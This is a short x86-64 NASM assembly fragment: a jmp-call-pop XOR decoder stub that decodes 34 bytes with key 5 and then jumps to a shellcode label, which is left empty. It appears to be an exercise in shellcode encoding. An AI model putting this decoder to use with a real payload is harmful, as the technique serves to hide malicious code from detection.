BITS 64
jmp short foo
bar:
	pop rsi
	xor rcx, rcx
	mov rcx, 34
decoder:
	xor byte [esi + ecx - 1], 5
	sub rcx, 1
	jnz decoder
	jmp short shellcode
foo:
	call bar
shellcode:
	